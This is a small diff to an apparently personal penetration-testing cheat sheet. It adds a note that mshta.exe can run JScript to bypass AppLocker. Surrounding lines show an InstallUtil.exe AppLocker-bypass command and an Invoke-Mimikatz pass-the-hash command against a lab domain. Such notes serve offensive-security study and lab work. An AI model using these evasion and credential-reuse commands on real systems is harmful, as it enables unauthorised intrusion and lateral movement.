@@ -314,6 +314,8 @@ Includes web services (not just port 80)
   ```
   C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\lowpriv\bypass.exe
   ```
+  - Requires downloaded to disk, but you can do it from memory too
+- Use `mshta.exe` to execute jscript and bypass Applocker
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
